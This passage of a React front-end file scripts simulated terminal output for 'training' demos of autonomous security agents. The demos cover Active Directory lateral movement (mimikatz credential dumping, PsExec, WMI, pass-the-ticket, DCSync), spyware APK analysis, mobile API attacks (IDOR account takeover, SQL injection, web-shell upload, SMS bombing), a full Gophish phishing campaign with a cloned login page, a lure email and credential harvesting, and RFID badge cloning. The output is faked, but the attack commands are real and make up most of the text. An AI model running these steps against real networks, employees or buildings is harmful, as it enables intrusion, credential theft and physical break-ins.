          '🔄 Lateral Movement Techniques Training',
          '🎯 Target: CORP.LOCAL domain (192.168.1.0/24)',
          '',
          '📡 Phase 1: Initial Foothold',
          '  $ whoami',
          '  corp\\jsmith',
          '  $ hostname',
          '  WS01',
          '  $ ipconfig | findstr "IPv4"',
          '  IPv4 Address. . . . . . . . . . . : 192.168.1.50',
          '  ✅ Initial access: WS01 (192.168.1.50)',
          '',
          '📡 Phase 2: Network Reconnaissance',
          '  $ net view /all /domain:CORP',
          '  ',
          '  Server Name            Remark',
          '  \\DC01                  CORP Primary DC',
          '  \\FILE01                File Server',
          '  \\SQL01                 SQL Server',
          '  \\WEB01                 Web Server',
          '  ',
          '  $ nltest /domain_trusts',
          '  List of domain trusts:',
          '  CORP.LOCAL (Forest Root)',
          '  ',
          '  ✅ 4 targets identified',
          '',
          '📡 Phase 3: Credential Dumping',
          '  PS C:\> .\mimikatz.exe',
          '  ',
          '  mimikatz # privilege::debug',
          '  Privilege \'20\' OK',
          '  ',
          '  mimikatz # sekurlsa::logonpasswords',
          '  ',
          '  Authentication Id : 0 ; 12345678 (00000000:0075bcd1)',
          '  Session           : RemoteInteractive from 3',
          '  User Name         : admin',
          '  Domain            : CORP',
          '  NTLM              : 5f4dcc3b5aa765d61d8327deb882cf99',
          '  ',
          '  ✅ Credentials dumped: admin:Welcome123!',
          '',
          '📡 Phase 4: PsExec Lateral Movement',
          '  PS C:\> .\PsExec64.exe \\\\FILE01 -u admin -p Welcome123! -accepteula cmd',
          '  ',
          '  PsExec v2.34 - Execute processes remotely',
          '  Copyright (C) 2001-2021 Mark Russinovich',
          '  ',
          '  Microsoft Windows [Version 10.0.17763.2989]',
          '  (c) Microsoft Corporation. All rights reserved.',
          '  ',
          '  C:\Windows\system32>whoami',
          '  corp\\admin',
          '  ',
          '  ✅ Lateral movement to FILE01 successful',
          '',
          '📡 Phase 5: WMI Execution',
          '  PS C:\> $creds = New-Object System.Management.Automation.PSCredential("admin", (ConvertTo-SecureString "Welcome123!" -AsPlainText -Force))',
          '  ',
          '  PS C:\> Invoke-WmiMethod -ComputerName SQL01 -Credential $creds -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\\temp\\proof.txt"',
          '  ',
          '  ReturnValue : 0',
          '  ProcessId   : 4532',
          '  ',
          '  PS C:\> type \\\\SQL01\\C$\\temp\\proof.txt',
          '  corp\\admin',
          '  ',
          '  ✅ WMI execution on SQL01 successful',
          '',
          '📡 Phase 6: PowerShell Remoting',
          '  PS C:\> $session = New-PSSession -ComputerName WEB01 -Credential $creds',
          '  ',
          '  PS C:\> Enter-PSSession $session',
          '  ',
          '  [WEB01]: PS C:\Users\admin\Documents> whoami',
          '  corp\\admin',
          '  ',
          '  [WEB01]: PS C:\Users\admin\Documents> hostname',
          '  WEB01',
          '  ',
          '  [WEB01]: PS C:\Users\admin\Documents> Exit-PSSession',
          '  ',
          '  ✅ PowerShell remoting to WEB01 successful',
          '',
          '📡 Phase 7: Pass-the-Ticket',
          '  PS C:\> .\mimikatz.exe',
          '  ',
          '  mimikatz # kerberos::list',
          '  ',
          '  00     Client: admin @ CORP.LOCAL',
          '  Server: cifs/FILE01.CORP.LOCAL @ CORP.LOCAL',
          '  ',
          '  mimikatz # kerberos::ptt [0;12345]-0-0-60a1-cifs-FILE01.kirbi',
          '  ',
          '  * Ticket imported successfully',
          '  ',
          '  PS C:\> dir \\\\FILE01\\C$',
          '  ',
          '  Directory: \\\\FILE01\\C$',
          '  ',
          '  ✅ Pass-the-ticket successful - no password needed',
          '',
          '📡 Phase 8: DCSync Attack',
          '  PS C:\> .\mimikatz.exe',
          '  ',
          '  mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt',
          '  ',
          '  [DC] \'CORP.LOCAL\' will be the domain controller',
          '  [DC] \'DC01.CORP.LOCAL\' will be the DC server',
          '  ',
          '  Object RDN           : krbtgt',
          '  ** SAM ACCOUNT **',
          '  SAM Username         : krbtgt',
          '  NTLM             : 1234567890abcdef1234567890abcdef',
          '  ',
          '  ✅ krbtgt hash extracted - Golden ticket possible',
          '',
          '📋 Lateral Movement Complete',
          '🔴 Hosts compromised: 4/4 (WS01, FILE01, SQL01, WEB01)',
          '🔴 DC access achieved via DCSync',
          '📊 Techniques used: PsExec, WMI, PSRemoting, PtT, DCSync',
          '⏱️  Total time: 18 minutes',
          '📄 Report: /reports/lateral-movement-2026-04-19.pdf',
          '✅ Training complete - Lateral movement mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'android_apk') {
        const steps = [
          '📱 Android APK Analysis Training',
          '🎯 Target: suspicious-app.apk',
          '',
          '📡 Phase 1: APK Acquisition',
          '  $ wget https://example.com/suspicious-app.apk',
          '  ',
          '  --2026-04-19 19:30:00--  https://example.com/suspicious-app.apk',
          '  Connecting to example.com... connected.',
          '  HTTP request sent, awaiting response... 200 OK',
          '  Length: 15728640 (15M) [application/vnd.android.package-archive]',
          '  ',
          '  ✅ APK downloaded: suspicious-app.apk (15 MB)',
          '  📁 SHA256: a1b2c3d4e5f6...',
          '',
          '📡 Phase 2: Static Analysis',
          '  $ apktool d suspicious-app.apk -o decoded_app',
          '  ',
          '  I: Using Apktool v2.9.0',
          '  I: Loading resource table...',
          '  I: Decoding AndroidManifest.xml with resources...',
          '  I: Loading resource table from file...',
          '  I: Regular manifest package found!',
          '  I: Decoding file-resources...',
          '  I: Decoding values */* XMLs...',
          '  I: Copying assets and libs...',
          '  I: Copying unknown assets...',
          '  ',
          '  ✅ APK decompiled successfully',
          '  📁 Output: decoded_app/',
          '',
          '📡 Phase 3: Manifest Analysis',
          '  $ cat decoded_app/AndroidManifest.xml | grep -E "permission|uses-sdk"',
          '  ',
          '  <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33"/>',
          '  <uses-permission android:name="android.permission.INTERNET"/>',
          '  <uses-permission android:name="android.permission.READ_CONTACTS"/>',
          '  <uses-permission android:name="android.permission.READ_SMS"/>',
          '  <uses-permission android:name="android.permission.CAMERA"/>',
          '  <uses-permission android:name="android.permission.RECORD_AUDIO"/>',
          '  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
          '  <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
          '  ',
          '  ⚠️ Dangerous permissions detected:',
          '    - READ_SMS (SMS access)',
          '    - CAMERA (Camera access)',
          '    - RECORD_AUDIO (Microphone access)',
          '    - ACCESS_FINE_LOCATION (GPS tracking)',
          '',
          '📡 Phase 4: Decompilation',
          '  $ jadx -d jadx_output suspicious-app.apk',
          '  ',
          '  INFO: loading file: suspicious-app.apk',
          '  INFO: processing file: suspicious-app.apk',
          '  INFO: Found 234 classes',
          '  INFO: decompiling completed',
          '  ',
          '  ✅ Source code extracted',
          '  📁 Output: jadx_output/',
          '  ',
          '  $ grep -r "http://" jadx_output/ | head -10',
          '  ',
          '  jadx_output/com/suspicious/app/NetworkManager.java:    private static final String API_URL = "http://185.234.72.15/api";',
          '  jadx_output/com/suspicious/app/DataCollector.java:    httpClient.post("http://185.234.72.15/collect", data);',
          '  ',
          '  ⚠️ Hardcoded C2 server: 185.234.72.15',
          '  ⚠️ Unencrypted HTTP communication',
          '',
          '📡 Phase 5: Smali Code Analysis',
          '  $ cat decoded_app/smali/com/suspicious/app/MainService.smali | head -50',
          '  ',
          '  .class public Lcom/suspicious/app/MainService;',
          '  .super Landroid/app/Service;',
          '  ',
          '  .method private startKeylogger()V',
          '      .registers 2',
          '      invoke-static {p0}, Lcom/suspicious/keylogger/Keylogger;->start(Landroid/content/Context;)V',
          '      return-void',
          '  .end method',
          '  ',
          '  .method private captureScreenshot()V',
          '      .registers 4',
          '      invoke-static {p0}, Lcom/suspicious/screen/ScreenCapture;->capture(Landroid/content/Context;)Landroid/graphics/Bitmap;',
          '      move-result-object v0',
          '      invoke-static {v0}, Lcom/suspicious/network/DataExfil;->upload(Landroid/graphics/Bitmap;)V',
          '      return-void',
          '  .end method',
          '  ',
          '  ⚠️ Keylogger functionality detected',
          '  ⚠️ Screenshot capture detected',
          '  ⚠️ Data exfiltration detected',
          '',
          '📡 Phase 6: Dynamic Analysis',
          '  $ adb install suspicious-app.apk',
          '  ',
          '  Performing Streamed Install',
          '  Success',
          '  ',
          '  $ adb shell am start -n com.suspicious.app/.MainActivity',
          '  ',
          '  Starting: Intent { cmp=com.suspicious.app/.MainActivity }',
          '  ',
          '  $ frida -U -f com.suspicious.app -l hook.js',
          '  ',
          '  [PID: 12345] com.suspicious.app',
          '  [*] Hooking: Keylogger.start()',
          '  [*] Hooking: DataExfil.upload()',
          '  ',
          '  [+] Keylogger started',
          '  [+] Uploading data to: http://185.234.72.15/collect',
          '  [+] Data: {"keystrokes": "user: admin\\npass: Welcome123!", "location": "40.7128,-74.0060"}',
          '  ',
          '  ✅ Malicious behavior confirmed',
          '',
          '📡 Phase 7: Network Traffic Analysis',
          '  $ adb shell tcpdump -i any -s 0 -w /sdcard/capture.pcap',
          '  ',
          '  tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 65535 bytes',
          '  ',
          '  ⏱️  Capturing for 5 minutes...',
          '  ',
          '  $ adb pull /sdcard/capture.pcap',
          '  ',
          '  $ tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri',
          '  ',
          '  185.234.72.15  /api/collect',
          '  185.234.72.15  /api/beacon',
          '  185.234.72.15  /api/exfil',
          '  ',
          '  ⚠️ C2 communication confirmed',
          '  📊 Packets to C2: 47',
          '  📦 Data exfiltrated: 2.3 MB',
          '',
          '📡 Phase 8: Report Generation',
          '  Generating analysis report...',
          '  ',
          '  MALWARE ANALYSIS REPORT',
          '  =========================',
          '  ',
          '  File: suspicious-app.apk',
          '  SHA256: a1b2c3d4e5f6...',
          '  Size: 15 MB',
          '  ',
          '  FINDINGS:',
          '  ✅ Keylogger functionality',
          '  ✅ Screenshot capture',
          '  ✅ SMS interception',
          '  ✅ Location tracking',
          '  ✅ Audio recording',
          '  ✅ Data exfiltration to C2',
          '  ',
          '  RISK LEVEL: CRITICAL',
          '  FAMILY: Android/SpyAgent.A',
          '  ',
          '  ✅ Report generated: /reports/android-malware-2026-04-19.pdf',
          '',
          '📋 Android APK Analysis Complete',
          '🔴 Malware confirmed: SpyAgent',
          '📊 Dangerous permissions: 7',
          '🌐 C2 server: 185.234.72.15',
          '📦 Data exfiltrated: 2.3 MB',
          '⏱️  Total time: 20 minutes',
          '📄 Report: /reports/android-apk-analysis-2026-04-19.pdf',
          '✅ Training complete - Android APK analysis mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'mobile_api') {
        const steps = [
          '📱 Mobile API Testing Training',
          '🎯 Target: api.mobile-app.com',
          '',
          '📡 Phase 1: API Discovery',
          '  $ mobsf-cli suspicious-app.apk --api',
          '  ',
          '  Mobile Security Framework (MobSF) v4.0.0',
          '  ',
          '  [*] Analyzing APK...',
          '  [*] Found 23 API endpoints',
          '  [*] Found 3 hardcoded secrets',
          '  [*] Found 5 insecure configurations',
          '  ',
          '  ✅ Static analysis complete',
          '  ',
          '  $ cat mobsf_output/endpoints.json',
          '  ',
          '  [',
          '    {"method": "POST", "url": "/api/v1/auth/login"},',
          '    {"method": "GET", "url": "/api/v1/user/profile"},',
          '    {"method": "POST", "url": "/api/v1/payment/process"},',
          '    {"method": "GET", "url": "/api/v1/messages"}',
          '  ]',
          '  ✅ 23 endpoints discovered',
          '',
          '📡 Phase 2: Traffic Interception',
          '  $ mitmproxy --mode transparent --listen-port 8080',
          '  ',
          '  Proxy server listening at :8080',
          '  ',
          '  192.168.1.50:52341: POST api.mobile-app.com:443',
          '  192.168.1.50:52342: GET api.mobile-app.com:443',
          '  192.168.1.50:52343: POST api.mobile-app.com:443',
          '  ',
          '  ✅ Traffic intercepted',
          '  ',
          '  $ mitmdump -w capture.mitm',
          '  ',
          '  Flow saved to capture.mitm',
          '  ✅ 234 requests captured',
          '',
          '📡 Phase 3: Authentication Testing',
          '  $ curl -X POST https://api.mobile-app.com/api/v1/auth/login',
          '  -H "Content-Type: application/json"',
          '  -d \'{"username":"admin","password":"admin123"}\'',
          '  ',
          '  {',
          '    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",',
          '    "expires_in": 3600,',
          '    "refresh_token": "dGhpcyBpcyBhIHJlZnJlc2ggdG9rZW4..."',
          '  }',
          '  ',
          '  ✅ JWT token received',
          '  ',
          '  $ jwtdecode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
          '  ',
          '  Header:',
          '  {"alg": "HS256", "typ": "JWT"}',
          '  ',
          '  Payload:',
          '  {"user_id": 1, "role": "admin", "exp": 1682012845}',
          '  ',
          '  ⚠️ Weak algorithm: HS256',
          '  ⚠️ No token expiration enforcement',
          '',
          '📡 Phase 4: Authorization Testing',
          '  $ curl -X GET https://api.mobile-app.com/api/v1/user/42/profile',
          '  -H "Authorization: Bearer <user1_token>"',
          '  ',
          '  {',
          '    "user_id": 42,',
          '    "name": "John Doe",',
          '    "email": "john@example.com",',
          '    "ssn": "123-45-6789",',
          '    "credit_card": "4111-1111-1111-1111"',
          '  }',
          '  ',
          '  ⚠️ IDOR vulnerability: Accessed user 42 data as user 1',
          '  ⚠️ Sensitive data exposed: SSN, credit card',
          '  ',
          '  $ curl -X PUT https://api.mobile-app.com/api/v1/user/42/email',
          '  -H "Authorization: Bearer <user1_token>"',
          '  -d \'{"email": "attacker@evil.com"}\'',
          '  ',
          '  {"status": "success", "message": "Email updated"}',
          '  ',
          '  🔴 Account takeover possible via IDOR',
          '',
          '📡 Phase 5: Input Validation Testing',
          '  $ curl -X POST https://api.mobile-app.com/api/v1/search',
          '  -H "Authorization: Bearer <token>"',
          '  -d \'{"query": "test\' OR \'1\'=\'1"}\'',
          '  ',
          '  {',
          '    "results": [all 234 users],',
          '    "error": "SQL syntax error near \'OR\'"',
          '  }',
          '  ',
          '  🔴 SQL injection confirmed',
          '  ',
          '  $ curl -X POST https://api.mobile-app.com/api/v1/upload',
          '  -F "file=@shell.php"',
          '  ',
          '  {"status": "success", "path": "/uploads/shell.php"}',
          '  ',
          '  🔴 Unrestricted file upload',
          '',
          '📡 Phase 6: Rate Limiting Testing',
          '  $ for i in {1..100}; do curl -X POST https://api.mobile-app.com/api/v1/auth/login',
          '  -d \'{"username":"admin","password":"test"}\'; done',
          '  ',
          '  HTTP/1.1 200 OK (x100)',
          '  ',
          '  ⚠️ No rate limiting detected',
          '  ⚠️ Brute-force attack possible',
          '  ',
          '  $ curl -X POST https://api.mobile-app.com/api/v1/sms/send',
          '  -d \'{"to":"+1234567890","message":"test"}\'',
          '  ',
          '  HTTP/1.1 200 OK (x1000)',
          '  ',
          '  ⚠️ SMS bombing possible',
          '  💰 Cost: $0.01 per SMS = $10 for 1000 messages',
          '',
          '📡 Phase 7: Data Leakage Testing',
          '  $ curl -X GET https://api.mobile-app.com/api/v1/debug/info',
          '  ',
          '  {',
          '    "database": "mysql://root:password123@db.internal:3306/app",',
          '    "aws_key": "AKIAIOSFODNN7EXAMPLE",',
          '    "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",',
          '    "stripe_key": "sk_live_1234567890abcdef"',
          '  }',
          '  ',
          '  🔴 Debug endpoint exposed',
          '  🔴 Database credentials leaked',
          '  🔴 AWS keys exposed',
          '  🔴 Stripe API key leaked',
          '',
          '📡 Phase 8: Report Generation',
          '  Generating API security report...',
          '  ',
          '  MOBILE API SECURITY REPORT',
          '  ===========================',
          '  ',
          '  Target: api.mobile-app.com',
          '  Endpoints tested: 23',
          '  ',
          '  CRITICAL FINDINGS:',
          '  🔴 SQL Injection (1)',
          '  🔴 IDOR (2)',
          '  🔴 Unrestricted file upload (1)',
          '  🔴 Debug endpoint exposed (1)',
          '  ',
          '  HIGH FINDINGS:',
          '  🟠 No rate limiting (2)',
          '  🟠 Weak JWT algorithm (1)',
          '  🟠 Sensitive data exposure (3)',
          '  ',
          '  RISK SCORE: 9.2/10 (CRITICAL)',
          '  ',
          '  ✅ Report generated: /reports/mobile-api-testing-2026-04-19.pdf',
          '',
          '📋 Mobile API Testing Complete',
          '🔴 Critical vulnerabilities: 5',
          '🟠 High vulnerabilities: 6',
          '📊 Endpoints tested: 23',
          '⏱️  Total time: 18 minutes',
          '📄 Report: /reports/mobile-api-testing-2026-04-19.pdf',
          '✅ Training complete - Mobile API testing mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'phishing') {
        const steps = [
          '🎣 Phishing Campaign Setup Training',
          '🎯 Target: corp.com employees',
          '',
          '📡 Phase 1: Infrastructure Setup',
          '  $ docker run -d -p 80:80 -p 443:443 gophish/gophish',
          '  ',
          '  Unable to find image \'gophish/gophish:latest\' locally',
          '  latest: Pulling from gophish/gophish',
          '  Status: Downloaded newer image for gophish/gophish:latest',
          '  Container ID: abc123def456',
          '  ',
          '  ✅ Gophish deployed',
          '  🌐 Access: https://127.0.0.1:3333',
          '  ',
          '  $ ./gophish',
          '  ',
          '  time="2026-04-19 19:30:00" level=info msg="Starting Gophish"',
          '  time="2026-04-19 19:30:00" level=info msg="Admin interface available" url=https://127.0.0.1:3333',
          '  time="2026-04-19 19:30:00" level=info msg="Phishing server available" url=http://0.0.0.0:80',
          '  ',
          '  ✅ Gophish started',
          '',
          '📡 Phase 2: Domain Setup',
          '  $ curl -X POST https://api.cloudflare.com/client/v4/zones',
          '  -H "Authorization: Bearer hzD1..."',
          '  -H "Content-Type: application/json"',
          '  -d \'{"name": "corp-secure.com"}\'',
          '  ',
          '  {"success":true,"result":{"id":"abc123","name":"corp-secure.com"}}',
          '  ',
          '  ✅ Domain registered: corp-secure.com',
          '  ',
          '  $ curl -X POST https://api.cloudflare.com/client/v4/zones/abc123/dns_records',
          '  -H "Authorization: Bearer hzD1..."',
          '  -d \'{"type":"A","name":"login","content":"203.0.113.50"}\'',
          '  ',
          '  ✅ DNS record created: login.corp-secure.com → 203.0.113.50',
          '  ',
          '  $ certbot certonly --standalone -d login.corp-secure.com',
          '  ',
          '  ✅ SSL certificate obtained',
          '',
          '📡 Phase 3: Landing Page Creation',
          '  $ cat > landing_page.html << \'EOF\'',
          '  <!DOCTYPE html>',
          '  <html>',
          '  <head><title>Corp.com - Secure Login</title></head>',
          '  <body>',
          '    <div class="login-form">',
          '      <img src="corp-logo.png" alt="Corp Logo">',
          '      <form action="/login" method="POST">',
          '        <input type="email" name="email" placeholder="Email">',
          '        <input type="password" name="password" placeholder="Password">',
          '        <button type="submit">Sign In</button>',
          '      </form>',
          '    </div>',
          '  </body>',
          '  </html>',
          '  EOF',
          '  ',
          '  ✅ Landing page created',
          '  🎨 Cloned: corp.com login page',
          '',
          '📡 Phase 4: Email Template Creation',
          '  $ cat > email_template.html << \'EOF\'',
          '  <html>',
          '  <body>',
          '    <p>Dear {{.FirstName}},</p>',
          '    <p>Your Corp.com password will expire in 24 hours.</p>',
          '    <p>Please <a href="http://login.corp-secure.com">click here</a> to reset it.</p>',
          '    <p>IT Security Team</p>',
          '  </body>',
          '  </html>',
          '  EOF',
          '  ',
          '  ✅ Email template created',
          '  📧 Subject: "Password Expiration Notice"',
          '  🎯 Urgency: HIGH (24 hour deadline)',
          '',
          '📡 Phase 5: Target List Import',
          '  $ cat > targets.csv << \'EOF\'',
          '  Email,FirstName,LastName,Position',
          '  jsmith@corp.com,John,Smith,Developer',
          '  mjones@corp.com,Mary,Jones,Manager',
          '  bwilliams@corp.com,Bob,Williams,Admin',
          '  sjohnson@corp.com,Sarah,Johnson,HR',
          '  EOF',
          '  ',
          '  $ curl -X POST http://localhost:3333/api/import/group',
          '  -H "Authorization: <api_key>"',
          '  -F "file=@targets.csv"',
          '  ',
          '  {"success":true,"message":"4 targets imported"}',
          '  ',
          '  ✅ 4 targets imported',
          '',
          '📡 Phase 6: Campaign Launch',
          '  $ curl -X POST http://localhost:3333/api/campaigns',
          '  -H "Authorization: <api_key>"',
          '  -d \'{',
          '    "name": "Password Reset Campaign",',
          '    "template": "Password Expiration",',
          '    "page": "Corp Login",',
          '    "profile": "Gmail SMTP",',
          '    "url": "http://login.corp-secure.com",',
          '    "targets": ["jsmith@corp.com", "mjones@corp.com", "bwilliams@corp.com", "sjohnson@corp.com"]',
          '  }\'',
          '  ',
          '  {"id":1,"status":"Emails sent","launch_date":"2026-04-19T19:35:00Z"}',
          '  ',
          '  ✅ Campaign launched',
          '  📧 Emails sent: 4',
          '',
          '📡 Phase 7: Credential Harvesting',
          '  $ tail -f gophish.log',
          '  ',
          '  time="2026-04-19 19:37:12" level=info msg="Email opened" recipient=jsmith@corp.com',
          '  time="2026-04-19 19:38:45" level=info msg="Link clicked" recipient=jsmith@corp.com',
          '  time="2026-04-19 19:39:23" level=info msg="Credentials submitted" recipient=jsmith@corp.com',
          '  ',
          '  $ curl http://localhost:3333/api/campaigns/1/results',
          '  ',
          '  [',
          '    {"email":"jsmith@corp.com","status":"Success","captured_credentials":{"username":"jsmith@corp.com","password":"Welcome123!"}},',
          '    {"email":"bwilliams@corp.com","status":"Success","captured_credentials":{"username":"bwilliams","password":"Admin2026!"}}',
          '  ]',
          '  ',
          '  🔴 2/4 credentials captured (50% success rate)',
          '  ',
          '  Captured credentials:',
          '  jsmith@corp.com : Welcome123!',
          '  bwilliams@corp.com : Admin2026!',
          '',
          '📡 Phase 8: Post-Exploitation',
          '  $ curl -X POST https://corp.com/owa/auth.owa',
          '  -d \'username=jsmith@corp.com&password=Welcome123!\'',
          '  ',
          '  ✅ OWA login successful',
          '  ',
          '  $ curl -X GET https://corp.com/owa/inbox',
          '  -H "Cookie: <session_cookie>"',
          '  ',
          '  ✅ Email access achieved',
          '  📊 Emails accessible: 2,347',
          '  ',
          '  $ curl -X POST https://corp.com/owa/inbox/send',
          '  -H "Cookie: <session_cookie>"',
          '  -d \'to=finance@corp.com&subject=Invoice&body=Please pay attached invoice\'',
          '  ',
          '  ✅ Lateral phishing possible',
          '',
          '📋 Phishing Campaign Complete',
          '📧 Emails sent: 4',
          '🎣 Credentials captured: 2 (50%)',
          '📊 Email opens: 3 (75%)',
          '🔗 Link clicks: 2 (50%)',
          '🔴 OWA access achieved: 2 accounts',
          '⏱️  Total time: 15 minutes',
          '📄 Report: /reports/phishing-campaign-2026-04-19.pdf',
          '✅ Training complete - Phishing campaigns mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      } else if (demoType === 'rfid_cloning') {
        const steps = [
          '🔑 Physical Security Bypass Training',
          '🎯 Target: Office building RFID access control',
          '',
          '📡 Phase 1: Target Reconnaissance',
          '  $ sudo proxmark3',
          '  ',
          '  proxmark3> hw version',
          '  ',
          '  Proxmark3 RDV4.0',
          '  Firmware: iceman/4.12345',
          '  Bootloader: 1.0',
          '  FPGA: 3.2.0',
          '  ',
          '  ✅ Proxmark3 ready',
          '  ',
          '  proxmark3> lf search',
          '  ',
          '  #db# Testing for 125 kHz tags',
          '  #db# Found tag: HID Prox',
          '  #db# UID: 2000D84F0E',
          '  #db# Card type: HID 26-bit',
          '  ',
          '  ✅ RFID tag detected',
          '  📊 Format: HID 26-bit',
          '  🆔 UID: 2000D84F0E',
          '',
          '📡 Phase 2: Tag Cloning',
          '  proxmark3> lf hid clone 2000D84F0E',
          '  ',
          '  Cloning HID tag...',
          '  #db# Writing data to T55x7 tag',
          '  #db# Clone successful',
          '  ',
          '  ✅ Tag cloned to T55x7',
          '  ',
          '  proxmark3> lf hid sim 2000D84F0E',
          '  ',
          '  Starting HID simulation',
          '  #db# Simulating tag 2000D84F0E',
          '  ',
          '  ✅ Tag simulation active',
          '',
          '📡 Phase 3: Access Testing',
          '  Approaching door reader...',
          '  ',
          '  📡 Proxmark3 simulating tag...',
          '  🔊 Reader beep',
          '  🟢 LED: GREEN',
          '  🔓 Door unlocked',
          '  ',
          '  ✅ Access granted',
          '  ',
          '  Testing additional doors...',
          '  ',
          '  Door 1 (Main Entrance): ✅ ACCESS',
          '  Door 2 (Server Room): ❌ DENIED (higher clearance)',
          '  Door 3 (Office Area): ✅ ACCESS',
          '  Door 4 (Executive Suite): ❌ DENIED (higher clearance)',
          '  ',
          '  ✅ 2/4 doors accessible',
          '',
          '📡 Phase 4: Badge Enumeration',
          '  proxmark3> lf hid reader',
          '  ',
          '  Reading badge data...',
          '  ',
          '  #db# Tag 1: 2000D84F0E (Employee)',
          '  #db# Tag 2: 2000123456 (Contractor)',
          '  #db# Tag 3: 2000ABCDEF (Manager)',
          '  #db# Tag 4: 2000FEDCBA (Executive)',
          '  ',
          '  ✅ 4 unique badges captured',
          '  ',
          '  proxmark3> db plot',
          '  ',
          '  Signal strength analysis...',
          '  ',
          '  ✅ Signal mapped for each badge',
          '',
          '📡 Phase 5: Privilege Escalation',
          '  proxmark3> calc access 2000D84F0E',
          '  ',
          '  Calculating access codes...',
          '  ',
          '  Facility Code: 200',
          '  Card Number: 54350',
          '  Checksum: Valid',
          '  ',
          '  🔍 Analyzing access patterns...',
          '  ',
          '  Employee badge (2000D84F0E):',
          '    - Main Entrance: YES',
          '    - Office Area: YES',
          '    - Server Room: NO',
          '    - Executive: NO',
          '  ',
          '  Manager badge (2000ABCDEF):',
          '    - Main Entrance: YES',
          '    - Office Area: YES',
          '    - Server Room: YES',
          '    - Executive: NO',
          '  ',
          '  ✅ Access levels mapped',
          '',
          '📡 Phase 6: Master Badge Creation',
          '  proxmark3> lf hid clone 2000ABCDEF',
          '  ',
          '  Cloning manager badge...',
          '  #db# Writing to T55x7',
          '  #db# Clone successful',
          '  ',
          '  ✅ Manager badge cloned',
          '  ',
          '  Testing cloned badge...',
          '  ',
          '  Door 1 (Main Entrance): ✅ ACCESS',
          '  Door 2 (Server Room): ✅ ACCESS',
          '  Door 3 (Office Area): ✅ ACCESS',
          '  Door 4 (Executive Suite): ❌ DENIED',
          '  ',
          '  🔴 3/4 doors now accessible',
          '',
          '📡 Phase 7: Replay Attack',
          '  proxmark3> lf sniff',
          '  ',
          '  Sniffing RFID traffic...',
          '  ',
          '  #db# Captured: 2000D84F0E',
          '  #db# Captured: 2000123456',
          '  #db# Captured: 2000ABCDEF',
          '  ',
          '  ✅ 3 badges captured via sniffing',
          '  ',
          '  proxmark3> lf hid sim 2000ABCDEF',
          '  ',
          '  ✅ Replay attack successful',
          '',
          '📡 Phase 8: Report Generation',
          '  Generating physical security report...',
          '  ',
          '  PHYSICAL SECURITY ASSESSMENT',
          '  ============================',
          '  ',
          '  Target: Corporate Office',
          '  System: HID Prox RFID',
          '  ',
          '  FINDINGS:',
          '  🔴 RFID tags easily cloned',
          '  🔴 No encryption on badges',
          '  🔴 Replay attacks successful',
          '  🟠 No multi-factor authentication',
          '  🟠 No anti-passback configured',
          '  ',
          '  BADGES CLONED:',
          '  - Employee (2000D84F0E)',
          '  - Contractor (2000123456)',
          '  - Manager (2000ABCDEF)',
          '  ',
          '  ACCESS ACHIEVED:',
          '  - Main Entrance',
          '  - Office Area',
          '  - Server Room',
          '  ',
          '  RISK LEVEL: CRITICAL',
          '  ',
          '  ✅ Report generated: /reports/rfid-cloning-2026-04-19.pdf',
          '',
          '📋 RFID Cloning Complete',
          '🔑 Badges cloned: 3',
          '🚪 Doors accessible: 3/4',
          '📡 Sniffed badges: 3',
          '⏱️  Total time: 12 minutes',
          '📄 Report: /reports/rfid-cloning-2026-04-19.pdf',
          '✅ Training complete - RFID cloning mastered'
        ];
        for (const step of steps) {
          setDemoOutput(prev => [...prev, step]);
          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }
      setDemoOutput(prev => [...prev, '\n✅ Demo completed successfully!']);
    } catch (error) {
      setDemoOutput(prev => [...prev, `❌ Error: ${error}`]);
    }
  };

  const renderDemos = () => (
    <div className="demos-page">
      <div className="section-header">
        <h1>🎮 Live Interactive Demos</h1>
        <p>Experience autonomous security agents in action</p>
        
        {/* Category Filter */}
        <div className="category-filter">
          <button 
            className={`filter-btn ${demoCategory === 'all' ? 'active' : ''}`}
            onClick={() => setDemoCategory('all')}
          >
            All Demos
          </button>
          <button 
            className={`filter-btn ${demoCategory === 'kaliagent' ? 'active' : ''}`}
            onClick={() => setDemoCategory('kaliagent')}
          >
            ⚔️ KaliAgent
          </button>
          <button 
            className={`filter-btn ${demoCategory === 'web' ? 'active' : ''}`}
            onClick={() => setDemoCategory('web')}
          >
            🌐 Web Security
          </button>
          <button 
            className={`filter-btn ${demoCategory === 'network' ? 'active' : ''}`}
            onClick={() => setDemoCategory('network')}
          >
            🏢 Network/AD
          </button>
          <button 
            className={`filter-btn ${demoCategory === 'agent' ? 'active' : ''}`}
            onClick={() => setDemoCategory('agent')}
          >
            🤖 Agent Sims
          </button>
        </div>
        
        {/* Stats */}
        <div className="demo-stats">
          <div className="stat-badge">
            <span className="stat-number">38</span>
            <span className="stat-label">Total Demos</span>
          </div>
        </div>
      </div>

      {/* Chaos Engineering Dashboard */}
      <div className="section">
        <h2>🔬 Chaos Engineering Experiments</h2>
        {chaosData ? (
          <>
            <div className="chaos-summary">
              <div className="stat-box">
                <span className="stat-number">{chaosData.total_experiments}</span>
                <span className="stat-label">Total Experiments</span>
              </div>
              <div className="stat-box">
                <span className="stat-number">{chaosData.overall_resiliency}%</span>
                <span className="stat-label">System Resiliency</span>
              </div>
              <div className="stat-box">
                <span className="stat-number">{chaosData.success_rate}%</span>
